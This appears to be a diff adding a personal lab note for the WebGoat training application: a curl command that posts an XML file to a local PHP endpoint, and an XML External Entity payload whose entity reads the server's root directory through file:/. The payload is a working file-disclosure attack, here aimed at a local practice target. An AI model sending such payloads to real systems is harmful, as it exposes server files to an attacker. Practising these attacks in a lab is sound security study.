@@ -1,0 +1,14 @@
+
+
+
+curl -X POST http://localhost:9500/autentica_xml.php -H "Content-Type: application/xml"  -d @xe.txt
+
+
+
+// webgoat
+
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY name SYSTEM "file:/">]>
+<searchForm>
+  <from>&name;</from>
+</searchForm>
